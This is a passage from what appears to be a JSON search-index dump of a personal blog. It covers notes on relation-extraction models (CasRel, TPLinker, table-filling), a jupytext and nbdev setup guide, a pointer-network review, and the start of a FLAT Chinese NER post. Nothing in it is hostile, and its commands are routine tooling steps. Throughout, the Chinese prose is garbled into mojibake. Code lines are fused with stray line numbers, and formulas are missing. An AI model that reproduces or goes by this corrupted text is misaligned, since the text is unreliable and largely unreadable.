åŒæ—¶ï¼Œè¿˜å­˜åœ¨çš„é—®é¢˜æœ‰ï¼šé¢„æµ‹æ ‡ç­¾çš„ä¸å¹³è¡¡ï¼Œç›¸åŒå®ä½“å‡ºç°ä¸åŒå…³ç³»æ—¶modeléš¾ä»¥æ‹Ÿåˆã€‚ framework CasRelæ˜¯ä¸€ç§frameworkï¼Œå°†å…³ç³»é¢„æµ‹ä»æ ‡æ³¨åˆ†ç±»è½¬åŒ–ä¸ºä¸€ä¸ªéšå¼å˜æ¢ï¼Œå‚ä¸æ¨¡å‹è®­ç»ƒï¼š \\[ f(s, o) \\rightarrow r \\] æœ¬æ¥æ˜¯subject + objectæ¨æ–­relationï¼Œå˜åŒ–ä¸ºï¼š \\[ f_r(s) \\rightarrow o \\] å°†relationå»ºæ¨¡æˆä¸€ç§functionã€‚ å°†likelihoodå˜æˆä»¥ä¸‹å½¢å¼ï¼š æ¨¡å‹æ•´ä½“æ¶æ„ æ¨¡å‹åœ¨å¤šä¸ªå…³ç³»æŠ½å–ä»»åŠ¡ä¸Šï¼Œæ•ˆæœæå‡æ˜æ˜¾ã€‚ TPlinker git TPlinkeræ˜¯ä¸åŒäºç°æœ‰æ¨¡å‹çš„ä¸€ç§ä¸€ä½“å¼å…³ç³»æŠ½å–æ¨¡å‹ã€‚è§£ç æ–¹å¼ç‹¬ç‰¹ã€‚ é€šè¿‡å®ä½“è¾¹ç•Œè¯ï¼ŒåŒºåˆ†åµŒå¥—å®ä½“ï¼šNew York City -&gt; (New, City), New York -&gt; (New, York) é€šè¿‡å®ä½“è¾¹ç•Œï¼Œåˆ†è§£ä¸‰å…ƒç»„ï¼š(De Blasio, live in, New York City) -&gt; (De, live in, New) and (Blasio, live in, City) ä¸¤ç§å¸¸è§çš„å¤„ç† relation overlapping çš„æ¨¡å¼ï¼š éƒ½åŒæ—¶å­˜åœ¨ä¸¤ä¸ªé—®é¢˜ï¼š æš´æ¼åå·®ï¼ˆexposure biasï¼‰ ï¼šæŒ‡åœ¨è®­ç»ƒé˜¶æ®µæ˜¯goldå®ä½“è¾“å…¥è¿›è¡Œå…³ç³»é¢„æµ‹ï¼Œè€Œåœ¨æ¨æ–­é˜¶æ®µæ˜¯ä¸Šä¸€æ­¥çš„é¢„æµ‹å®ä½“è¾“å…¥è¿›è¡Œå…³ç³»åˆ¤æ–­ï¼›å¯¼è‡´è®­ç»ƒå’Œæ¨æ–­å­˜åœ¨ä¸ä¸€è‡´ åµŒå¥—å®ä½“ï¼ˆnested entitiesï¼‰ï¼šå¹¶æ²¡æœ‰æœ‰æ•ˆå¤„ç†åµŒå¥—å®ä½“å…³ç³»ã€‚ TPlinkerçš„æ ‡æ³¨æ–¹å¼ é¦–å…ˆå¯¹ä¸åŒçš„å…³ç³»ï¼Œåˆ†åˆ«è¿›è¡Œæ ‡æ³¨ã€‚æ¯ç§å…³ç³»çš„æ ‡æ³¨æ–¹å¼ç›¸åŒã€‚ ä¸‰ç±»æ ‡è®°ï¼š ç´«è‰²æ ‡è®°ï¼šå•ä¸ªå®ä½“çš„å¤´å°¾å¯¹åº”å…³ç³»ã€‚å’Œå…³ç³»ç±»å‹æ— å…³ã€‚shape: len(text) * len(text) çº¢è‰²æ ‡è®°ï¼šå¯¹åº” subjectå’Œobject çš„ startå¯¹åº”æ ‡è®°ã€‚æ¯ç§å…³ç³»ä¸€ä¸ªå•ç‹¬æ ‡è®°çŸ©é˜µã€‚shape: R * len(text) * len(text) è“è‰²æ ‡è®°ï¼šå¯¹åº” subjectå’Œobject çš„ endå¯¹åº”æ ‡è®°ã€‚æ¯ç§å…³ç³»ä¸€ä¸ªå•ç‹¬æ ‡è®°çŸ©é˜µã€‚shape: R * len(text) * len(text) åŒæ—¶ï¼Œçº¢è‰²æ ‡è®°å’Œè“è‰²æ ‡è®°ï¼Œåœ¨len(text) * len(text)çš„çŸ©é˜µä¸­ï¼Œå­˜åœ¨ä¸¤ä¸ªå¯¹ç§°çš„æ ‡è®°ï¼Œæ¯”å¦‚ï¼ˆNew, Deï¼‰ä¸ (De, New)ã€‚ä¸ºäº†æé«˜æ•ˆç‡ï¼Œå°†ä¸‹ä¸‰è§’éƒ¨åˆ†æ˜ å°„åˆ°ä¸Šä¸‰è§’éƒ¨åˆ†ï¼ŒåŒæ—¶å€¼å˜æˆ2ã€‚ æ¨¡å‹ä¸ºï¼š å›¾ä¸­ Handshaking Kernelï¼Œå°±æ˜¯å°† æ ‡è®°çŸ©é˜µå±•å¼€å¾—åˆ°çš„ä¸€ç»´ç¼–ç ã€‚token pair éå†äº†æ‰€æœ‰å¯èƒ½çš„ å¯¹åº”å…³ç³»ã€‚å›¾ä¸­S -- subjectï¼›O -- object; H -- head; T -- tailï¼› E -- entity é€šè¿‡è¿™äº›æ ‡è®°ï¼Œè®­ç»ƒæ¨¡å‹è®¡ç®—æŸå¤±ï¼Œtoken pairçš„encoder outputæ‹¼æ¥åœ¨ä¸€èµ·ï¼Œè¾“å…¥softmaxï¼Œæ¯ä¸ªå…³ç³»ç±»å‹éƒ½æœ‰ä¸€ä¸ªsoftmaxã€‚ è§£ç è¿‡ç¨‹ é¢„æµ‹æ¨¡å‹è®¡ç®—ç»“æœ ç»“æœEH-to-ETå¯ä»¥å¾—åˆ°å¥å­ä¸­æ‰€æœ‰çš„å®ä½“ï¼ŒEHçš„ token idxä½œä¸ºkeyï¼ŒEH-to-ETçš„entityä½œä¸ºvalueï¼Œå­˜å…¥ D ä¸­ï¼Œå¾—åˆ°å¯é€‰å®ä½“ï¼› å¼€å§‹éå† ä¸åŒå…³ç³»ï¼› ç»“æœSH-to-OHå¯ä»¥å¾—åˆ°æŸç§å…³ç³»å¯é€‰çš„ head å¯¹åº”å…³ç³»ï¼Œå–è¿™äº›head indexï¼Œä» D ä¸­ï¼Œå–å‡ºå¯¹åº”å®ä½“å¯¹ token pair å­˜äº D2ï¼› ç»“æœST-to-OTå¯ä»¥å¾—åˆ°æŸç§å…³ç³»å¯é€‰çš„ tail å¯¹åº”å…³ç³»ï¼Œå°†è¿™ä¸ªå¯¹åº”å…³ç³»çš„ token pair å­˜å…¥ Eï¼› éå†D2ï¼Œå¹¶æ£€æŸ¥ æ¯ä¸€ä¸ª D2ä¸­çš„ token pair çš„ tail æ˜¯å¦å­˜åœ¨äº E ä¸­ï¼Œè‹¥å­˜åœ¨ï¼Œé‚£ä¹ˆè¾“å‡º è¯¥å…³ç³»ä¸‹çš„è¯¥ä¸‰å…ƒç»„ä¿¡æ¯ã€‚ More å®ä½“å¯¹è¾“å‡ºçš„embeddingè¡¨ç¤ºæ˜¯ç›´æ¥ concatenateï¼Œé‚£ä¹ˆå¦‚æœä¸¤ä¸ªå®ä½“çš„contextç›¸ä¼¼ï¼Œé‚£ä¹ˆç†è®ºä¸Šä¼šå½±å“é¢„æµ‹æ•ˆæœã€‚ ç”±äºè¦é¢„æµ‹ N ä¸ªè¯ä¸­é€‰ 2 çš„æ’åˆ—ä¸ª pairï¼Œæ‰€ä»¥å¯¹äºé•¿æ–‡æœ¬ï¼Œä»£ä»·ä¼šå¾ˆå¤§ã€‚ Two-are-better-than-one git ç»Ÿä¸€NERå’ŒREä»»åŠ¡åˆ°ä¸€ä¸ªè¡¨æ ¼æ ‡è®°é¢„æµ‹ä»»åŠ¡ã€‚ æ ‡è®°å½¢å¼å¾ˆç›´è§‚ã€‚åªæ˜¯è¿™åœ¨14å¹´å°±å·²ç»æœ‰è¿™ç§æ–¹æ³•çš„å°è¯•äº†ã€‚è¿™ç¯‡è®ºæ–‡ä½œè€…æ˜¯å¯¹å…¶è¿›è¡Œäº†æ”¹è¿›ã€‚ é™¤äº†ä¸€äº›å…³ç³»æŠ½å–ä»»åŠ¡å¸¸è§çš„é—®é¢˜ï¼Œè¿™ç§æ ‡è®°æ–¹å¼è¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼š ç°æœ‰çš„åŸºäºTable-Fillingæ–¹æ³•ï¼Œä¼šå°†è¡¨ç»“æ„è½¬åŒ–æˆä¸€ä¸ªåºåˆ—ç»“æ„ï¼Œè¡¨ç»“æ„çš„æ ‡è®°æ–¹å¼ç›´æ¥é€€åŒ–ã€‚ ç»“æ„è®¾è®¡ é¦–å…ˆæ˜¯ Text Embeddingï¼šGloveè¯å‘é‡ã€LSTMå­—ç¬¦å‘é‡å’ŒBERTè¯å‘é‡çš„å…±åŒæ„æˆã€‚ Table Encoderï¼šå­¦ä¹ è¡¨æ ¼ä¸­æ¯ä¸ªä½ç½®çš„å‘é‡è¡¨è¾¾ï¼Œshape: len(text) * len(text)ã€‚è¡¨æ ¼ç¬¬ i è¡Œç¬¬ j åˆ—çš„å‘é‡è¡¨ç¤ºï¼Œä¸å¥å­ä¸­çš„ç¬¬ i ä¸ªå’Œç¬¬ j ä¸ªè¯ç›¸å¯¹åº”ã€‚ ä½¿ç”¨ MD-RNN èåˆè¡¨æ ¼ä¸­ä¸Šä¸‹å·¦å³çš„ä¿¡æ¯ã€‚æ¥æ”¶ Sequence Encoder ç¼–ç çš„ å½“å‰ ç¬¬ i ã€ç¬¬ j ä¸ªè¯çš„å‘é‡è¡¨ç¤ºã€‚ ä½†æ˜¯ï¼Œè®ºæ–‡å®éªŒå‘ç°ï¼Œä¸å¿…è®¡ç®—å››ç»„ï¼Œåªéœ€è¦ä¸¤ç»„ï¼Œå°±èƒ½è¾¾åˆ°å‡ ä¹æ— æŸçš„æ•ˆæœã€‚åªè®¡ç®— a å’Œ cã€‚ Sequence Encoderï¼šSequence Encoderçš„ç»“æ„ä¸Transformerç±»ä¼¼ï¼Œä¸åŒä¹‹å¤„åœ¨äºå°†Transformerä¸­çš„scaled dot-product attention æ›¿æ¢ä¸º table-guided attentionã€‚ åŸ transformer çš„ attention ï¼š å˜ä¸ºï¼š ç›´æ¥ä½¿ç”¨ \\(T_{l,i,j}\\)èŠ‚çœäº†è®¡ç®—é‡ï¼ŒåŒæ—¶äº¤äº’ä¸¤ä¸ªéƒ¨åˆ†ä¿¡æ¯ã€‚ Pre-trained Attention Weightsï¼šåˆ©ç”¨é¢„è®­ç»ƒçš„ BERT ä¸­æ¯ä¸€å±‚çš„ attention ä¿¡æ¯ï¼Œå¾—åˆ° \\(T^l\\) ï¼Œè”åˆ S æ„æˆMD-RNNçš„åˆå§‹è¾“å…¥ ã€‚ é¢„æµ‹ç»“æœè¡¨ç¤ºä¸ºï¼š è¡¨æ ¼ä¸­å¯¹ç§°ä½ç½®ï¼Œåœ¨é¢„æµ‹æ—¶ç›´æ¥æ±‚å’Œï¼Œå¾—åˆ°ä¸€ä¸ªå…³ç³»çš„å¾—åˆ†ã€‚","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"relation extraction","slug":"relation-extraction","permalink":"https://racleray.github.io/tags/relation-extraction/"}]},{"title":"jupytext and nbdev","slug":"jupytext-and-nbdev","date":"2021-03-24T13:54:30.000Z","updated":"2023-08-07T12:20:13.022Z","comments":true,"path":"posts/c1cb8a12.html","link":"","permalink":"https://racleray.github.io/posts/c1cb8a12.html","excerpt":"è®°å½•fast.AIå›¢é˜Ÿå¼€æºçš„ jupytext ä¸ nbdev å·¥å…·çš„é…ç½®ã€‚","text":"Jupytext ç•Œé¢ç‚¹å‡»æ“ä½œ å½“ä½  Pair ä¸€ç§æ–‡ä»¶ï¼Œä¿å­˜æ—¶ï¼Œä¼šè‡ªåŠ¨ç”Ÿæˆä½  pair å…³è”çš„æ ¼å¼çš„æ–‡ä»¶ã€‚åœ¨å…¶ä¸­ä¸€ä¸ªæ–‡ä»¶ä¿®æ”¹çš„ä»»ä½•æ–‡æœ¬éƒ½ä¼šåŒæ­¥åˆ°ä¸¤ä¸ªæ–‡ä»¶ä¸­ã€‚ é¦–å…ˆä½ æœ‰æ–‡ä»¶ ç„¶åï¼Œåœ¨jupyter labä¸­ ctrl + shift + cï¼Œé€‰æ‹©pairçš„æ–‡ä»¶ç±»å‹ï¼ˆjupyter notebookåœ¨åŠŸèƒ½èœå•ä¸­æ‰¾åˆ°ï¼‰ ç„¶åï¼Œä¿å­˜ å…³è”æˆåŠŸã€‚pyæ–‡ä»¶å¯ä»¥åœ¨è‡ªå·±å–œæ¬¢IDEç¯å¢ƒç¼–è¾‘ï¼Œipynbæ–‡ä»¶å¯ä»¥åŒæ­¥å±•ç¤ºã€‚åˆ é™¤ä»»æ„ä¸€ä¸ªï¼Œéƒ½å¯ä»¥å†æ¬¡æ¢å¤ã€‚ å–æ¶ˆpairï¼Œåˆ™ä¸ä¼šåŒæ­¥ã€‚ï¼ˆunpair å–æ¶ˆå…³è”ï¼‰ pyæ–‡ä»¶ä¸­åŒ…å«çš„ metadata å¦‚ä¸‹æ ¼å¼ å‘½ä»¤è¡Œæ“ä½œ Notebook to text 12jupytext --to markdown notebook.ipynbjupytext --to script notebook.ipynb text to notebook 12jupytext --to notebook notebook.pyjupytext --to notebook notebook.md text to notebook and preserve outputs 12jupytext --to notebook --update notebook.pyjupytext --to notebook --update notebook.md å‘½ä»¤è¡Œpairæ“ä½œ 1jupytext --set-formats ipynb,py:percent notebook.ipynb åŒæ­¥paired notebooksï¼Œå½“åœ¨å…¶ä»–æ–‡ä»¶ä¸­ä¿®æ”¹åï¼ŒåŒæ­¥åˆ°ipynb 1jupytext --sync notebook.ipynb åº”ç”¨code style(flake8, black, isort) 1jupytext --pipe flake8 notebook.ipynb æ”¯æŒæ–‡ä»¶æ ¼å¼ NBDEVå¼€å‘ step 1 æ–°å»ºgit ä½¿ç”¨ the template åˆ›å»ºä¸€ä¸ªgithub repo 1pip install nbdev å¯é€‰ï¼Œä½¿ç”¨gitè‡ªå¸¦çš„æœåŠ¡å™¨ï¼šåœ¨settingä¸­ åœ¨editä¸­æ·»åŠ ç”Ÿæˆçš„ç½‘å€ step 2 ç¼–è¾‘settings.ini ç¼–è¾‘settings.ini ï¼ˆæ³¨æ„è¿™é‡Œçš„lib_nameå°±æ˜¯ç”Ÿæˆçš„åŒ…åï¼Œæ‰€ä»¥æœ‰ç©ºæ ¼å¾ˆä¸è§„èŒƒï¼‰ã€‚å‰é¢çš„ä¸ªäººç›¸å…³ä¿¡æ¯åŸºæœ¬éƒ½è¦å–æ¶ˆæ³¨é‡Šï¼Œåé¢åœ¨gitä¸Šåˆ›å»ºç½‘é¡µå±•ç¤ºç¯å¢ƒè¦checkã€‚ 1git clone https://github.com/RacleRay/Hello_nbdev.git step 3 å®‰è£…git_hooks 1nbdev_install_git_hooks å‡ºç°conflicté”™è¯¯æ—¶ 1nbdev_fix_merge filename.ipynb step 4 ç¼–è¾‘ä»£ç  å¼€å§‹ç¼–è¾‘ipynbæ–‡ä»¶ æ ‡è®°ç±»åˆ«ï¼š #default_exp å¯¹äºæ–°åˆ›å»ºçš„ .ipynbï¼Œéœ€è¦åŠ å…¥ #default_exp target_module_name è¿™ä¼šå¯¼å‡ºç”Ÿæˆä»¥ä¸‹pyæ–‡ä»¶ 1lib_name/target_module_name.py lib_nameä¸settingsæ—¶ï¼Œä¿æŒä¸€è‡´ #exportï¼šæ•ˆæœå¦‚ä¸‹ å¯¼å‡ºåæ˜¾ç¤ºå¦‚ä¸‹ å¦‚æœæ˜¯ç±»é‡Œé¢çš„æ–¹æ³•ï¼Œæ˜¾ç¤ºdocéœ€è¦ä½¿ç”¨å‡½æ•° show_doc 1from nbdev,showdoc import show_doc ä¸åŠ æ ‡è®°ä¼šæ˜¾ç¤ºä»£ç å’Œè¾“å‡º æµ‹è¯•ä»£ç ä¹Ÿå¯ä»¥å†™åœ¨è¿™é‡Œï¼Œä¸ä»£æ ‡è®° 1assert say_hello(\"Jeremy\")==\"Hello Jeremy!\" step 5 nbdev_build_lib 1nbdev_build_lib æ³¨æ„ï¼Œå‘ç”ŸkeyErroræ—¶ï¼Œå¤šåŠæ˜¯settings.inié…ç½®ä¸å®Œæ•´ ç”Ÿæˆæ–°çš„libåŒ…æ–‡ä»¶å¤¹åŠpyæ–‡ä»¶ core.py step 6 ç¼–å†™indexæ–‡ä»¶ ç¼–è¾‘index.ipnb step 7 ç”Ÿæˆdocsæ–‡æ¡£ 1nbdev_build_docs ç”ŸæˆHTMLæ–‡æ¡£ step 8 ä¸Šä¼ git 1234git add -Agit statusgit commit -m \"test\"git push step 9 bug æ£€æŸ¥ commitsä¸­çš„é—®é¢˜ æ²¡æœ‰è®¾ç½®keywordsï¼Œåœ¨settings.iniä¸­è¿›è¡Œè®¾ç½®ã€‚ optional step 10 å‘å¸ƒpypi ä¸Šä¼ åˆ°pypi æ³¨å†Œpypi åœ¨ç”¨æˆ·å®¶ç›®å½•ä¸‹æ–°å»º~/.pypirc 123[pypi]username = your_pypi_usernamepassword = your_pypi_password pip install twine make release é™„ å…¶ä»–äº‹é¡¹ å®‰è£…åŒ…ï¼ŒåŒæ—¶åŒæ­¥æ‰€æœ‰åœ¨æºç ä¸Šçš„ç¼–è¾‘ 1pip install -e . å¯ä»¥å°†è‡ªå·±å¼€å‘çš„åŒ…é“¾æ¥åˆ°pythonåŒ…è·¯å¾„ä¸‹ 1ln -s lib_path lib_name autoreload 12%load_ext autoreload%autoreload 2 åœ¨ipynbç»“å°¾æ·»åŠ ä»¥ä¸‹ä»£ç ï¼Œç”¨ä»¥ä»£æ›¿å‘½ä»¤è¡Œnbdev_build_libã€‚ 1from nbdev.export import notebook2script; notebook2script() æ£€æŸ¥å¯è¯»çš„notebook 1nbdev_read_nbs æ£€æŸ¥å¯èƒ½é€ æˆmerge confictsçš„æ–‡ä»¶ï¼Œ 1nbdev_clean_nbs å¯èƒ½å¯¼è‡´cleanedé¡¹ä¸é€šè¿‡ï¼Œæ­¤æ—¶ç”¨ï¼Œç„¶åå†push æ£€æŸ¥notebookå’Œå·²ç»å¯¼å‡ºçš„lib filesä¹‹é—´çš„æ˜¯å¦æœ‰å·®å¼‚ 1nbdev_diff_nbs è¿è¡Œnotebooksä¸­çš„æµ‹è¯• 1nbdev_test_nbs fastaiæ–‡æ¡£ nbdev git nbdev_template","categories":[{"name":"Tools","slug":"Tools","permalink":"https://racleray.github.io/categories/Tools/"},{"name":"python","slug":"Tools/python","permalink":"https://racleray.github.io/categories/Tools/python/"}],"tags":[{"name":"tools","slug":"tools","permalink":"https://racleray.github.io/tags/tools/"},{"name":"jupyter","slug":"jupyter","permalink":"https://racleray.github.io/tags/jupyter/"}]},{"title":"Pointer review","slug":"Pointer-review","date":"2021-03-18T14:37:39.000Z","updated":"2023-08-07T11:54:31.032Z","comments":true,"path":"posts/6875388b.html","link":"","permalink":"https://racleray.github.io/posts/6875388b.html","excerpt":"å›é¡¾ä¸€ä¸‹Pointer networkã€‚åœ¨å­¦ä¹  transformer + pointer çš„æ‘˜è¦ç”Ÿæˆæ¨¡å‹æ—¶ï¼Œå¾—ç©ºç¨ç¨è®°å½•ä¸€ä¸‹ã€‚","text":"å›é¡¾ä¸€ä¸‹Pointer network Pointer ? What ? ä»ä¸€å †ç‚¹ä¸­ï¼Œæ‰¾å‡º å‡¸åŒ… è¾¹ç•Œç‚¹ã€‚ convex hullï¼šä¸€æ¡åœˆä½æ‰€æœ‰ç‚¹çš„æ©¡çš®ç­‹ Seq generation bad seq2seqï¼Œåœ¨å¤„ç†ç”Ÿæˆä»»åŠ¡æ—¶ï¼Œæ— æ³•å¤„ç† OOV é—®é¢˜ã€‚å¯ä»¥ç†è§£ä¸ºï¼Œåœ¨decodeæ—¶æ˜ å°„çš„è¯è¡¨vocabularyæ˜¯å˜åŒ–çš„ã€‚ How to solveï¼Ÿ å‡å¦‚ï¼Œå°†è¾“å…¥textä¸­æ¯ä¸ªwordå½“åšä¸€ä¸ªç‚¹ï¼Œseq2seqä»»åŠ¡è½¬æ¢ä¸ºåœ¨è¾“å…¥çš„æ–‡æœ¬ä¸­æ‰¾åˆ°ä¸€ä¸ª â€œconvex hullâ€ å¯ä»¥summarizeæ•´ä¸ªè¾“å…¥çš„è¯­ä¹‰å†…å®¹ï¼Œæ˜¯å¦å¯è¡Œï¼Ÿ è¾“å‡ºå…¨éƒ½ä» è¾“å…¥ ä¸­ copyã€‚ æ ¹æ®è¾“å…¥çš„è¯­ä¹‰è¡¨ç¤ºï¼Œç”¨ä¸€ä¸ªlanguage modelè¾“å‡ºç”Ÿæˆæ–‡æœ¬ã€‚ å‡å¦‚è¦ä¿æŒ decoder çš„language modelçš„æ³›åŒ–ç”Ÿæˆèƒ½åŠ›ï¼ŒåŒæ—¶copyä¸€äº›è¾“å…¥ä¸­çš„é‡è¦ä¿¡æ¯ã€‚æ¨¡å‹è¢«ä¿®æ”¹ä¸ºä¸‹é¢è¿™æ · è¾“å‡ºä¸ºï¼šè”åˆ source text ä¸­çš„attention distribution å’Œ decoderåœ¨vocabularyä¸Šçš„é¢„æµ‹åˆ†å¸ƒï¼Œä»¥ Pgen åŠ æƒçš„ç»“æœã€‚ Final distributionçš„åˆ†å¸ƒä¸­æ˜¯åŒ…å«äº† source text å’Œ vocabulary ä¸­çš„æ‰€æœ‰è¯çš„ã€‚ åŒæ—¶ï¼Œ\\(P_{gen}\\)è®¾è®¡ä¸ºå¯å­¦ä¹ çš„å‚æ•°ã€‚ Reduce repeatsï¼Ÿ å°† attention distribution è¿›è¡Œå†å²ç´¯è®¡ï¼Œåœ¨ä¸‹ä¸€æ­¥è®¡ç®—attentionæ—¶è¾“å…¥ã€‚å³ï¼ŒCoverage Mechanismã€‚ åŒæ—¶ï¼Œæ·»åŠ æ–°çš„æŸå¤±é¡¹ã€‚è®©æ¨¡å‹ä¸è¦è¿‡åˆ†å…³æ³¨æŸäº›è¯ã€‚ï¼š æœ€ç»ˆæŸå¤±ä¸ºï¼š More æ³¨æ„äº‹é¡¹: ï¼ˆ1ï¼‰åœ¨æ¨¡å‹è®­ç»ƒåˆ°ä¸€å®šç¨‹åº¦åï¼Œå†ä½¿ç”¨Coverage Mechanismã€‚ ï¼ˆ2ï¼‰åœ¨æ¨¡å‹çš„è®­ç»ƒç¯èŠ‚ï¼Œåˆšå¼€å§‹çš„æ—¶å€™ï¼Œå¤§çº¦æœ‰70%çš„è¾“å‡ºåºåˆ—æ˜¯ç”±Pointer Networkäº§ç”Ÿçš„ï¼Œéšç€æ¨¡å‹é€æ¸æ”¶æ•›ï¼Œè¿™ä¸ªæ¦‚ç‡ä¸‹é™åˆ°47%ã€‚ç„¶è€Œï¼Œåœ¨æµ‹è¯•ç¯èŠ‚ä¸­ï¼Œæœ‰83%çš„è¾“å‡ºåºåˆ—æ˜¯ç”±Pointer Networkäº§ç”Ÿçš„ã€‚ä½œè€…çŒœæµ‹è¿™ä¸ªå·®å¼‚çš„åŸå› åœ¨äºï¼šè®­ç»ƒç¯èŠ‚çš„decoderä½¿ç”¨äº†çœŸå®çš„ç›®æ ‡åºåˆ—ã€‚ ï¼ˆ3ï¼‰ä½œè€…æ›¾å°è¯•ä½¿ç”¨ä¸€ä¸ª15ä¸‡é•¿åº¦çš„å¤§è¯è¡¨ï¼Œä½†æ˜¯å¹¶ä¸èƒ½æ˜¾è‘—æ”¹å–„æ¨¡å‹æ•ˆæœã€‚ Code å…¶ä»–åŒç±»æ¨¡å‹ï¼š å°†LMéƒ¨åˆ†ä¹Ÿå˜ä¸º attention ï¼Œè¿›è¡Œå¤šä¸ª source text çš„è¾“å…¥çš„ç”Ÿæˆä»»åŠ¡ã€‚Multi-Source Pointer Network ä¸è®¡ç®— \\(P_{gen}\\) ï¼Œè€Œç›´æ¥åˆ†æˆå¤šç§ æƒ…å†µï¼Œè¿›è¡Œä¸åŒçš„ ç”Ÿæˆè¿‡ç¨‹ã€‚CopyNet","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"deep learning","slug":"deep-learning","permalink":"https://racleray.github.io/tags/deep-learning/"},{"name":"pointer net","slug":"pointer-net","permalink":"https://racleray.github.io/tags/pointer-net/"}]},{"title":"å®ä½“è¯†åˆ«æ¨¡å‹ä¸ç­–ç•¥2020","slug":"å®ä½“è¯†åˆ«æ¨¡å‹ä¸ç­–ç•¥2020","date":"2021-03-10T15:21:03.000Z","updated":"2023-08-07T11:54:31.041Z","comments":true,"path":"posts/548512d6.html","link":"","permalink":"https://racleray.github.io/posts/548512d6.html","excerpt":"è®°å½•NERæ¯”èµ›ä¸­ç”¨åˆ°çš„æ–°ä¸œè¥¿ã€‚FLATæ¨¡å‹ç»“æ„ï¼ŒMRCç­‰æ–¹æ³•çš„è®¾è®¡æ€è·¯ï¼ŒFGMå’ŒSWAç­‰è®­ç»ƒæŠ€å·§ï¼Œä¼ªæ ‡ç­¾è®¾è®¡æ€è·¯ç­‰ã€‚","text":"æ¨¡å‹ FLAT FLATéƒ¨åˆ†BlogåŸæ–‡ï¼šhttps://mp.weixin.qq.com/s/6aU6ZDYPWPHc3KssuzArKw è®ºæ–‡ï¼šFLAT: Chinese NER Using Flat-Lattice Transformer å°†Latticeå›¾ç»“æ„æ— æŸè½¬æ¢ä¸ºæ‰å¹³çš„Flatç»“æ„çš„æ–¹æ³•ï¼Œå¹¶å°†LSTMæ›¿æ¢ä¸ºäº†æ›´å…ˆè¿›çš„Transformer Encoderï¼Œæ›´å¥½åœ°å»ºæ¨¡äº†åºåˆ—çš„é•¿æœŸä¾èµ–å…³ç³»ï¼› æå‡ºäº†ä¸€ç§é’ˆå¯¹Flatç»“æ„çš„ç›¸å¯¹ä½ç½®ç¼–ç æœºåˆ¶ï¼Œä½¿å¾—å­—ç¬¦ä¸è¯æ±‡ä¿¡æ¯äº¤äº’æ›´ç›´æ¥ï¼Œåœ¨åŸºäºè¯å…¸çš„ä¸­æ–‡NERæ¨¡å‹ä¸­å–å¾—äº†SOTAã€‚ ç”±äºä¸­æ–‡è¯æ±‡çš„ç¨€ç–æ€§å’Œæ¨¡ç³Šæ€§ï¼ŒåŸºäºå­—ç¬¦çš„åºåˆ—æ ‡æ³¨æ¨¡å‹å¾€å¾€æ¯”åŸºäºè¯æ±‡çš„åºåˆ—æ ‡æ³¨æ¨¡å‹è¡¨ç°æ›´å¥½ï¼Œä½†åœ¨åŸºäºå­—ç¬¦çš„æ¨¡å‹ä¸­å¼•å…¥åˆ†è¯ä¿¡æ¯å¾€å¾€èƒ½å¤Ÿå¸¦æ¥æ€§èƒ½çš„æå‡ï¼Œå°¤å…¶æ˜¯å¯¹äºNERä»»åŠ¡æ¥è¯´ï¼Œè¯æ±‡èƒ½å¤Ÿæä¾›ä¸°å¯Œçš„å®ä½“è¾¹ç•Œä¿¡æ¯ã€‚ Lattice LSTMé¦–æ¬¡æå‡ºä½¿ç”¨Latticeç»“æ„åœ¨NERä»»åŠ¡ä¸­èå…¥è¯æ±‡ä¿¡æ¯ï¼Œå¦‚å›¾æ‰€ç¤ºï¼Œä¸€ä¸ªå¥å­çš„Latticeç»“æ„æ˜¯ä¸€ä¸ªæœ‰å‘æ— ç¯å›¾ï¼Œæ¯ä¸ªèŠ‚ç‚¹æ˜¯ä¸€ä¸ªå­—æˆ–è€…ä¸€ä¸ªè¯ã€‚ è®¾è®¡é€‚åº”Latticeç»“æ„çš„æ¨¡å‹ Lattice LSTM (ACL 2018): å°†è¯æ±‡ä¿¡æ¯å¼•å…¥ä¸­æ–‡NERçš„å¼€ç¯‡ä¹‹ä½œï¼Œä½œè€…å°†è¯èŠ‚ç‚¹ç¼–ç ä¸ºå‘é‡ï¼Œå¹¶åœ¨å­—èŠ‚ç‚¹ä»¥æ³¨æ„åŠ›çš„æ–¹å¼èåˆè¯å‘é‡ã€‚ Lexicon Rethink CNN(IJCAI 2019): ä½œè€…æå‡ºäº†å«æœ‰rethinkæœºåˆ¶çš„CNNç½‘ç»œè§£å†³Lattice LSTMçš„è¯æ±‡å†²çªé—®é¢˜ã€‚ RNNå’ŒCNNéš¾ä»¥å»ºæ¨¡é•¿è·ç¦»çš„ä¾èµ–å…³ç³»ï¼Œä¸”åœ¨Lattice LSTMä¸­çš„å­—ç¬¦åªèƒ½è·å–å‰å‘ä¿¡æ¯ï¼Œæ²¡æœ‰å’Œè¯æ±‡è¿›è¡Œè¶³å¤Ÿå……åˆ†çš„å…¨å±€äº¤äº’ FLAT Git Repo ä»Transformerçš„position representationå¾—åˆ°å¯å‘ï¼Œä½œè€…ç»™æ¯ä¸€ä¸ªtoken/span(å­—ã€è¯)å¢åŠ äº†ä¸¤ä¸ªä½ç½®ç¼–ç ï¼Œåˆ†åˆ«è¡¨ç¤ºè¯¥spanåœ¨sentenceä¸­å¼€å§‹(head)å’Œç»“æŸ(tail)çš„ä½ç½® æ‰å¹³çš„ç»“æ„å…è®¸æˆ‘ä»¬ä½¿ç”¨Transformer Encoderï¼Œå…¶ä¸­çš„self-attentionæœºåˆ¶å…è®¸ä»»ä½•å­—ç¬¦å’Œè¯æ±‡è¿›è¡Œç›´æ¥çš„äº¤äº’ Relative Position Encoding of Spans spanæ˜¯å­—ç¬¦å’Œè¯æ±‡çš„æ€»ç§°ï¼Œspanä¹‹é—´å­˜åœ¨ä¸‰ç§å…³ç³»ï¼šäº¤å‰ã€åŒ…å«ã€åˆ†ç¦»ï¼Œç„¶è€Œä½œè€…æ²¡æœ‰ç›´æ¥ç¼–ç è¿™äº›ä½ç½®å…³ç³»ï¼Œè€Œæ˜¯å°†å…¶è¡¨ç¤ºä¸ºä¸€ä¸ªç¨ å¯†å‘é‡ã€‚ä½œè€…ç”¨ å’Œ è¡¨ç¤ºspançš„å¤´å°¾ä½ç½®åæ 